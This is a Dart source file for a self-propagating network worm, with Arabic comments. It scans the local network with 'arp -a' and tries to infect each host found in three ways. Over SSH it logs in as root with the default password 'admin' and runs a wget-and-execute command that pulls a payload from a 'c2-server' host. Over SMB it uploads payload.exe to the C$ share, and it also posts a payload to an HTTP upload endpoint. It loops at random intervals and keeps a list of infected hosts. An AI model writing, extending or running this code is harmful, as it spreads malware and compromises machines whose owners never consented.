import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:math';

class UltimateAutoPropagationSystem {
  final List<Map<String, dynamic>> _infectedTargets = [];
  bool _isSpreading = false;

  /// بدء الانتشار التلقائي
  Future<void> startSpreading() async {
    _isSpreading = true;
    while (_isSpreading) {
      await _scanAndInfect();
      await Future.delayed(Duration(seconds: Random().nextInt(60) + 30));
    }
  }

  /// مسح وإصابة الأهداف
  Future<void> _scanAndInfect() async {
    final targets = await _discoverTargets();
    for (final target in targets) {
      if (!_isSpreading) break;
      await _infectTarget(target);
    }
  }

  /// اكتشاف الأهداف
  Future<List<Map<String, dynamic>>> _discoverTargets() async {
    final targets = <Map<String, dynamic>>[];

    try {
      // ARP Scan
      final result = await Process.run('arp', ['-a'], runInShell: true);
      final lines = result.stdout.toString().split('\n');
      for (final line in lines) {
        final ipMatch = RegExp(r'(\d+\.\d+\.\d+\.\d+)').firstMatch(line);
        final macMatch = RegExp(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})').firstMatch(line);
        if (ipMatch != null) {
          targets.add({
            'ip': ipMatch.group(1),
            'mac': macMatch?.group(1) ?? 'Unknown',
          });
        }
      }
    } catch (_) {}

    return targets;
  }

  /// إصابة هدف
  Future<bool> _infectTarget(Map<String, dynamic> target) async {
    final ip = target['ip'] as String;

    // تجنب إعادة إصابة نفس الهدف
    if (_infectedTargets.any((t) => t['ip'] == ip)) return false;

    // محاولة الإصابة عبر SSH
    if (await _trySshInfection(ip)) {
      _infectedTargets.add(target);
      return true;
    }

    // محاولة الإصابة عبر SMB
    if (await _trySmbInfection(ip)) {
      _infectedTargets.add(target);
      return true;
    }

    // محاولة الإصابة عبر HTTP
    if (await _tryHttpInfection(ip)) {
      _infectedTargets.add(target);
      return true;
    }

    return false;
  }

  Future<bool> _trySshInfection(String ip) async {
    try {
      final result = await Process.run('sshpass', ['-p', 'admin', 'ssh', '-o', 'StrictHostKeyChecking=no', 'root@$ip', 'wget http://c2-server/payload.sh -O /tmp/p.sh && sh /tmp/p.sh'], runInShell: true);
      return result.exitCode == 0;
    } catch (_) {
      return false;
    }
  }

  Future<bool> _trySmbInfection(String ip) async {
    try {
      final result = await Process.run('smbclient', ['//$ip/C\$', '-U', 'admin%admin', '-c', 'put payload.exe'], runInShell: true);
      return result.exitCode == 0;
    } catch (_) {
      return false;
    }
  }

  Future<bool> _tryHttpInfection(String ip) async {
    try {
      final client = HttpClient();
      final request = await client.postUrl(Uri.parse('http://$ip:8080/upload'));
      request.write('payload');
      final response = await request.close();
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  void stopSpreading() {
    _isSpreading = false;
  }

  List<Map<String, dynamic>> getInfectedTargets() => _infectedTargets;
}
